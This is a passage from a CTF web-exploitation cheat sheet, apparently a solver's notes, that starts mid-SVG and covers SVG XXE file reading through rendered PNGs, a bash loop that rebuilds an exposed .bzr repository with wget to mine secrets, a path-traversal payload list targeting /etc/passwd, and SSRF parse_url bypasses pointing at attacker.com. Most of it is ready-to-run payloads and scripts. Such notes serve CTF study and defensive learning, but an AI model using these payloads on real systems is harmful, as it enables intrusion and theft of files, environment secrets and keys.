</svg>
```

Upload, download the PNG, and read the flag off the image (eyeball or OCR). When hunting the flag path, dump `/proc/self/status` first to find the PID, then probe `/proc/<pid>/cwd/flag.txt`, `/proc/<pid>/cmdline`, and `/proc/<pid>/environ`. If the first pass clips (e.g. width=3000), re-render wider — BSidesSF 2019 SVGMagic landed the flag only at `width="3000"` because the target path was short.

**关键结论：** SVG renderers that honour DOCTYPE + ENTITY expansion are XXE-vulnerable just like any XML parser; enlarge `width` to fit large file contents into the rendered image, and remember the output channel is *pixels*, not text — `grep` the PNG for the flag after OCR (e.g. `tesseract img.png -`) or open it manually.

**参考：** BSidesSF 2019 CTF — SVGMagic (PNGSVG), writeup 13711. See also the svglib variant in xml-command-and-graphql-injection.md.

---

### Bazaar (.bzr) Repository Reconstruction via bzr check Loop (STEM CTF 2019)

```bash
# 1. Seed a local repo so bzr has a skeleton to work with
mkdir ctf && cd ctf && bzr init
echo foo > foo.txt && bzr add && bzr commit -m init && rm foo.txt

# 2. Replace the pointer files with copies from the victim
cd .bzr/branch     && rm last-revision && wget http://target/.bzr/branch/last-revision
cd ../checkout     && rm dirstate       && wget http://target/.bzr/checkout/dirstate
cd ../repository   && rm pack-names     && wget http://target/.bzr/repository/pack-names
cd ../../

# 3. Loop until bzr check stops complaining about missing indices/packs
while true; do
  OUT=$(bzr check 2>&1)
  [[ "$OUT" != *"No such file:"* ]] && break
  F=$(echo "$OUT" | sed 's/.*\([0-9a-f]\{32\}\).*/\1/')
  for EXT in cix iix rix six tix; do
    wget -P .bzr/repository/indices/ "http://target/.bzr/repository/indices/$F.$EXT"
  done
  wget -P .bzr/repository/packs/ "http://target/.bzr/repository/packs/$F.pack"
done
bzr revert

# 4. Mine every revision for interesting diffs
for R in $(bzr log --line | awk '{print $1}'); do bzr diff -r$((R-1))..$R; done
```

**关键结论：** Exposed `.bzr/` (or `.git/`, `.hg/`, `.svn/`) directories leak full commit history; bzr is particularly friendly because it tolerates partial repos and reports the missing path verbatim, so a wget-in-a-loop solver finishes the job. Always diff revisions, not just `HEAD` — flags, wallet keys, and decryption keys are often *removed* in a later commit but still recoverable. Once the tree is reconstructed you can chain with challenges like STEM CTF "Medium is overrated", where revision N stores a base64 ciphertext and revision M stores the AES-ECB key.

**参考：** STEM CTF Cyber Challenge 2019 — My First Blog & Medium is overrated, writeups 13380 and 13379


---

## Path Traversal / LFI 速查
```text
../../../etc/passwd
....//....//....//etc/passwd     # Filter bypass
..%2f..%2f..%2fetc/passwd        # URL encoding
%252e%252e%252f                  # Double URL encoding
{.}{.}/flag.txt                  # Brace stripping bypass
```

**Windows 8.3 short filename bypass:** `FILEFO~1.EXT` short names bypass path filters that check the long filename. See parser-wrapper-and-legacy-ssrf-tricks.md.

**URL parse_url @ bypass:** `http://valid@attacker.com/` -- PHP `parse_url()` extracts `attacker.com` as host, bypassing domain checks. See parser-wrapper-and-legacy-ssrf-tricks.md.
- **SSRF double-@ parse discrepancy:** `http://x:x@127.0.0.1:80@allowed.host/path` — `parse_url()` sees `allowed.host`, curl connects to `127.0.0.1`. Distinct from single-@ bypass. See parser-wrapper-and-legacy-ssrf-tricks.md.

**/dev/fd symlink bypass:** When `/proc` is blacklisted, use `/dev/fd/../environ` -- `/dev/fd` symlinks to `/proc/self/fd`, so `../` reaches `/proc/self/`. See path-traversal-ssrf-upload-and-rsc.md.

**Python footgun:** `os.path.join('/app/public', '/etc/passwd')` returns `/etc/passwd`


---
